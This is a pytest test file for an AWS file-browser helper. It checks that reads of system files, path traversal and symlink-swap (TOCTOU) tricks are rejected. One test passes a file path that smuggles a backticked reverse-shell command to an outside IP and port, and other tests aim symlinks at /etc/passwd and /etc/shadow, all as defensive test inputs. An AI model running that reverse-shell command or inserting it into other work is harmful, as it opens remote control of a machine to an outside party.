#  Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
#  Licensed under the Apache License, Version 2.0 (the "License"). You may not use this file except in compliance
#  with the License. A copy of the License is located at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  or in the 'license' file accompanying this file. This file is distributed on an 'AS IS' BASIS, WITHOUT WARRANTIES
#  OR CONDITIONS OF ANY KIND, express or implied. See the License for the specific language governing permissions
#  and limitations under the License.

"""
Test Cases for FileSystemHelper
"""

import errno
import os
import pathlib
from subprocess import CompletedProcess

import pytest
from ideasdk.filesystem.filesystem_helper import FileSystemHelper
from ideasdk.shell import ShellInvocationResult, ShellInvoker
from ideasdk.utils import Utils

from ideadatamodel import (
    CreateFileRequest,
    DeleteFilesRequest,
    DownloadFilesRequest,
    ListFilesRequest,
    ReadFileRequest,
    SaveFileRequest,
    TailFileRequest,
    errorcodes,
    exceptions,
)


class MockShellInvoker:
    def __init__(self, test_case: str):
        self.test_case = test_case

    def list_files(self):
        return ShellInvocationResult(
            command="",
            result=CompletedProcess(
                args="ls",
                returncode=0,
                stdout="""internal
bin
boot
dev
etc
home
lib
lib64
local
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var""",
                stderr=None,
            ),
            total_time_ms=1,
        )

    def invoke(self, *args, **_) -> ShellInvocationResult:
        command = args[0]

        if command[3].startswith("test"):
            return ShellInvocationResult(
                command="",
                result=CompletedProcess(
                    args="test", returncode=0, stdout="", stderr=None
                ),
                total_time_ms=10,
            )
        elif self.test_case == "list-root-dir":
            return self.list_files()


@pytest.fixture()
def file_system_helper(request, context, monkeypatch):
    username = "mockuser"

    stat = os.stat_result((0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    monkeypatch.setattr(os, "stat", lambda *_, **__: stat)
    monkeypatch.setattr(os, "lstat", lambda *_, **__: stat)

    helper = FileSystemHelper(
        context=context,
        username=username,
    )
    helper.shell = MockShellInvoker(request.param[0])
    return helper


@pytest.mark.parametrize("file_system_helper", [["list-root-dir"]], indirect=True)
def test_file_browser_list_files_root_directory(
    context, file_system_helper, monkeypatch
):
    """
    list files in root directory and ensure only internal and home directories can be listed
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)
    result = file_system_helper.list_files(ListFilesRequest(cwd="/"))

    for file_data in result.listing:
        assert file_data.name in ("mnt", "internal", "home")


@pytest.mark.parametrize(
    "file_system_helper", [["read-restricted-file"]], indirect=True
)
def test_file_browser_read_file_restricted_access(
    context, file_system_helper, monkeypatch
):
    """
    try to read a file in restricted directories and unauthorized access exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)

    monkeypatch.setattr(Utils, "is_file", lambda *_: True)
    monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.read_file(ReadFileRequest(file="/etc/shadow"))
    assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS


@pytest.mark.parametrize("file_system_helper", [["check-access"]], indirect=True)
def test_file_browser_check_access_invalid_path_unauthorized_access(
    context, file_system_helper, monkeypatch
):
    """
    try to read a file in restricted directories and unauthorized access exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)
    monkeypatch.setattr(pathlib.Path, "exists", lambda *_: False)
    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.check_access(
            file='/"`bash -i >& /dev/tcp/54.214.65.93/3377 0>&1`\\'
        )
    assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS


@pytest.mark.parametrize(
    "file_system_helper", [["disabled-filebrowser"]], indirect=True
)
@pytest.mark.parametrize(
    "cwd,file,filename,content",
    [("/home/admin1/Desktop/", "/home/admin1/Desktop/file1", "file1", "%CONTENT%")],
)
def test_file_browser_disabled_success(
    context, file_system_helper, cwd, file, filename, content, monkeypatch
):
    """
    try to use file browser when disabled and disabled feature exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: False)

    monkeypatch.setattr(Utils, "is_file", lambda *_: True)
    monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

    monkeypatch.setattr(Utils, "is_dir", lambda *_: True)

    monkeypatch.setattr(FileSystemHelper, "get_user_home", lambda *_: "/home/admin1/")

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.list_files(ListFilesRequest(cwd=cwd))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.read_file(ReadFileRequest(file=file))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.tail_file(TailFileRequest(file=file))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.save_file(SaveFileRequest(file=cwd, content=content))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.download_files(DownloadFilesRequest(files=[file]))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.create_file(
            CreateFileRequest(cwd=cwd, filename=filename, is_folder=False)
        )
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.delete_files(DeleteFilesRequest(files=[file]))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE


# ============================================================
# Tests for safe_open helper (TOCTOU fix)
# ============================================================

import shutil
import tempfile


@pytest.fixture
def safe_open_helper(context):
    """Create a FileSystemHelper with a real temp directory as user home."""
    tmp_dir = tempfile.mkdtemp()
    user_home = os.path.join(tmp_dir, "testuser")
    os.makedirs(user_home)

    helper = FileSystemHelper(context=context, username="testuser")
    # Override get_user_home to use our temp directory
    helper.get_user_home = lambda: user_home
    helper._user_home = user_home

    yield helper, user_home

    shutil.rmtree(tmp_dir, ignore_errors=True)


class TestSafeOpen:
    """Unit tests for the safe_open helper method."""

    def test_safe_open_allows_normal_file_access(self, safe_open_helper):
        """safe_open allows reading a normal file within user's home directory."""
        helper, user_home = safe_open_helper
        test_file = os.path.join(user_home, "normal.txt")
        with open(test_file, "w") as f:
            f.write("hello world")

        with helper.safe_open(test_file, "r") as f:
            content = f.read()
        assert content == "hello world"

    def test_safe_open_allows_nested_file_access(self, safe_open_helper):
        """safe_open allows reading a file in a subdirectory within user's home."""
        helper, user_home = safe_open_helper
        subdir = os.path.join(user_home, "subdir")
        os.makedirs(subdir)
        test_file = os.path.join(subdir, "nested.txt")
        with open(test_file, "w") as f:
            f.write("nested content")

        with helper.safe_open(test_file, "r") as f:
            content = f.read()
        assert content == "nested content"

    def test_safe_open_rejects_symlink_on_final_component(
        self, safe_open_helper, monkeypatch
    ):
        """Layer 3 rejects symlink swapped in after realpath (TOCTOU scenario)."""
        helper, user_home = safe_open_helper

        # Symlink pointing outside user home (attacker swap)
        symlink = os.path.join(user_home, "link.txt")
        os.symlink("/etc/passwd", symlink)

        # Simulate TOCTOU: realpath saw a regular file before the swap
        monkeypatch.setattr(os.path, "realpath", lambda p: p)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_symlink_on_intermediate_directory(
        self, safe_open_helper, monkeypatch
    ):
        """Layer 2 rejects symlink directory swapped in after realpath (TOCTOU scenario)."""
        helper, user_home = safe_open_helper

        # Create a symlink directory pointing outside user home
        symlink_dir = os.path.join(user_home, "linkdir")
        os.symlink("/etc", symlink_dir)

        # Simulate TOCTOU: realpath saw a real directory before the swap
        monkeypatch.setattr(os.path, "realpath", lambda p: p)

        symlink_path = os.path.join(symlink_dir, "passwd")
        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink_path, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_path_outside_user_home(self, safe_open_helper):
        """safe_open rejects paths that resolve outside the user's home directory."""
        helper, user_home = safe_open_helper
        # Create a file outside user home
        outside_file = os.path.join(os.path.dirname(user_home), "outside.txt")
        with open(outside_file, "w") as f:
            f.write("outside data")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(outside_file, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_path_traversal(self, safe_open_helper):
        """safe_open rejects path traversal attempts (../)."""
        helper, user_home = safe_open_helper
        # realpath resolves ../  so this should resolve outside user home
        traversal_path = os.path.join(user_home, "..", "outside.txt")
        outside_file = os.path.realpath(traversal_path)
        # Create the target file
        with open(outside_file, "w") as f:
            f.write("traversal target")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(traversal_path, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_allows_write_mode(self, safe_open_helper):
        """safe_open allows writing a file within user's home directory."""
        helper, user_home = safe_open_helper
        test_file = os.path.join(user_home, "writable.txt")

        with helper.safe_open(test_file, "w") as f:
            f.write("written content")

        with open(test_file, "r") as f:
            assert f.read() == "written content"

    def test_safe_open_rejects_symlink_to_outside_on_write(self, safe_open_helper):
        """safe_open rejects writing via a symlink pointing outside user home."""
        helper, user_home = safe_open_helper
        outside_file = os.path.join(os.path.dirname(user_home), "target.txt")
        symlink = os.path.join(user_home, "evil_link.txt")
        os.symlink(outside_file, symlink)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink, "w")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_propagates_file_not_found(self, safe_open_helper):
        """safe_open raises OSError (not unauthorized_access) for non-existent files."""
        helper, user_home = safe_open_helper
        missing_file = os.path.join(user_home, "does_not_exist.txt")

        with pytest.raises(OSError) as exc_info:
            helper.safe_open(missing_file, "r")
        assert exc_info.value.errno == errno.ENOENT


class TestListFilesLstat:
    """Test that list_files uses lstat (does not follow symlinks for metadata)."""

    def test_list_files_skips_symlinks(self, context, monkeypatch):
        """list_files skips symlink entries entirely."""
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "testuser")
        os.makedirs(user_home)

        # Create a regular file and a symlink
        regular = os.path.join(user_home, "regular.txt")
        with open(regular, "w") as f:
            f.write("data")
        symlink = os.path.join(user_home, "link.txt")
        os.symlink("/etc/shadow", symlink)

        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        helper.shell = type(
            "MockShell",
            (),
            {
                "invoke": lambda *a, **k: ShellInvocationResult(
                    command="",
                    result=CompletedProcess(
                        args="ls",
                        returncode=0,
                        stdout="regular.txt\nlink.txt",
                        stderr=None,
                    ),
                    total_time_ms=1,
                )
            },
        )()
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)

        result = helper.list_files(ListFilesRequest(cwd=user_home))

        file_names = [f.name for f in result.listing]
        assert "regular.txt" in file_names
        assert "link.txt" not in file_names

        shutil.rmtree(tmp_dir, ignore_errors=True)


class TestAPIsUseSafeOpen:
    """Verify that FileBrowser API methods use safe_open instead of direct open()."""

    def test_read_file_uses_safe_open(self, context, monkeypatch):
        """read_file calls safe_open, not open()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

        safe_open_called = []
        original_safe_open = helper.safe_open

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import StringIO

            return StringIO("test content")

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)

        result = helper.read_file(ReadFileRequest(file="/home/testuser/test.txt"))
        assert len(safe_open_called) == 1
        assert safe_open_called[0] == ("/home/testuser/test.txt", "r")

    def test_save_file_uses_safe_open(self, context, monkeypatch):
        """save_file calls safe_open, not open()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)
        monkeypatch.setattr(Utils, "base64_decode", lambda *_: "content")

        safe_open_called = []

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import StringIO

            return StringIO()

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)

        helper.save_file(
            SaveFileRequest(file="/home/testuser/test.txt", content="Y29udGVudA==")
        )
        assert len(safe_open_called) == 1
        assert safe_open_called[0] == ("/home/testuser/test.txt", "w")

    def test_download_files_uses_safe_open(self, context, monkeypatch):
        """download_files calls safe_open for each file, not ZipFile.write()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_dir", lambda *_: True)
        monkeypatch.setattr(Utils, "is_symlink", lambda *_: False)
        monkeypatch.setattr(os, "makedirs", lambda *a, **k: None)
        monkeypatch.setattr(shutil, "chown", lambda *a, **k: None)
        monkeypatch.setattr(FileSystemHelper, "get_primary_group_id", lambda *_: 1000)
        monkeypatch.setattr(Utils, "short_uuid", lambda: "abc123")

        safe_open_called = []

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import BytesIO

            return BytesIO(b"file content")

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)

        # Mock ZipFile to avoid actual file creation
        from unittest.mock import MagicMock, patch

        mock_zipfile = MagicMock()
        with patch(
            "ideasdk.filesystem.filesystem_helper.ZipFile", return_value=mock_zipfile
        ):
            mock_zipfile.__enter__ = lambda s: s
            mock_zipfile.__exit__ = lambda s, *a: None
            helper.download_files(
                DownloadFilesRequest(files=["/home/testuser/file1.txt"])
            )

        assert len(safe_open_called) == 1
        assert safe_open_called[0] == ("/home/testuser/file1.txt", "rb")
